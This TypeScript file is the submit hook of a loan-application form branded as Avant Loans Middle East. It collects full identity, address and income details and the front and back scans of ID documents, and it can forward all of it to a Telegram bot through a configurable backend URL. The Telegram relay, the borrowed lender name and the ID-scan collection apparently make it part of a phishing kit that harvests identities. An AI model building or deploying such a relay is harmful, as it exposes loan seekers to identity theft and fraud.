/*
 * Application submit hook.
 *
 * DEMO-SAFE BY DEFAULT: if VITE_TELEGRAM_API_URL is not set at build time,
 * this never touches the network — it returns { delivered: false } and the UI
 * shows the "nothing was sent" demo success state.
 *
 * Once Ronald provides a backend URL (a Cloudflare Worker / serverless function
 * that holds the Telegram bot token as a secret — see server/telegram-worker.js),
 * set VITE_TELEGRAM_API_URL and rebuild. The token is NEVER in client code.
 */
export const API_URL: string = (import.meta.env.VITE_TELEGRAM_API_URL ?? "").trim()
export const isLive = API_URL.length > 0

export type Application = Record<string, string>

export interface SubmitResult {
  delivered: boolean
  error?: string
}

/** Human-friendly labels + grouping for the Telegram message and summary. */
export const FIELD_GROUPS: { title: string; fields: [string, string][] }[] = [
  { title: "Loan request", fields: [["loan-type", "Loan type"], ["loan-amount", "Loan amount (USD)"], ["loan-duration", "Loan duration"]] },
  { title: "Applicant", fields: [["first-name", "First name"], ["last-name", "Last name"], ["email", "Email"], ["birth-date", "Birth date"], ["marital", "Marital status"], ["dependents", "Dependents"], ["residency", "Residency"], ["second-applicant", "Second applicant"]] },
  { title: "Identity", fields: [["id-type", "ID type"], ["id-number", "ID number"], ["id-expiry", "ID expiry"]] },
  { title: "Address", fields: [["street", "Street"], ["street-2", "Street line 2"], ["city", "City"], ["region", "Region"], ["postal", "Postal / ZIP"], ["country", "Country"]] },
  { title: "Employment & income", fields: [["employment", "Employment"], ["employer", "Employer"], ["job-title", "Job title"], ["years-employed", "Years employed"], ["annual-income", "Gross annual income"], ["other-income", "Other monthly income"], ["monthly-debts", "Monthly debts"], ["pay-frequency", "Pay frequency"]] },
  { title: "Loan details", fields: [["purpose", "Purpose"], ["vehicle-make", "Vehicle make"], ["vehicle-model", "Vehicle model"], ["vehicle-year", "Vehicle year"], ["business-name", "Business name"], ["school-name", "School / program"], ["notes", "Notes"]] },
]

export type IdDocs = { front?: File; back?: File }

export function buildSummaryText(data: Application, docs: IdDocs = {}): string {
  const ts = new Date().toISOString()
  const lines: string[] = ["Avant Loans Middle East — demo application", `Submitted: ${ts}`, ""]
  for (const g of FIELD_GROUPS) {
    const rows = g.fields.filter(([k]) => (data[k] ?? "").trim() !== "")
    if (!rows.length) continue
    lines.push(`== ${g.title} ==`)
    for (const [k, label] of rows) lines.push(`${label}: ${data[k]}`)
    lines.push("")
  }
  const attached = (["front", "back"] as const).filter((k) => docs[k]).map((k) => `${k} (${docs[k]!.name}, ${Math.round(docs[k]!.size / 1024)} KB)`)
  if (attached.length) lines.push("== ID documents ==", `Attached: ${attached.join("; ")}`, "(sent as separate files below)")
  return lines.join("\n").trim()
}

export async function submitApplication(data: Application, docs: IdDocs = {}): Promise<SubmitResult> {
  if (!isLive) return { delivered: false } // demo mode: no network at all

  const payload = {
    source: "avant-loans-3d",
    submittedAt: new Date().toISOString(),
    summary: buildSummaryText(data, docs),
    fields: data,
  }
  // multipart/form-data: JSON payload + ID files. The browser sets the boundary header.
  const body = new FormData()
  body.append("payload", JSON.stringify(payload))
  if (docs.front) body.append("id_front", docs.front, docs.front.name)
  if (docs.back) body.append("id_back", docs.back, docs.back.name)
  try {
    const res = await fetch(API_URL, { method: "POST", body })
    if (!res.ok) {
      const j = await res.json().catch(() => ({} as { error?: string }))
      return { delivered: false, error: j.error ? `${j.error} (${res.status})` : `Server responded ${res.status}` }
    }
    return { delivered: true }
  } catch (e) {
    return { delivered: false, error: e instanceof Error ? e.message : "Network error" }
  }
}
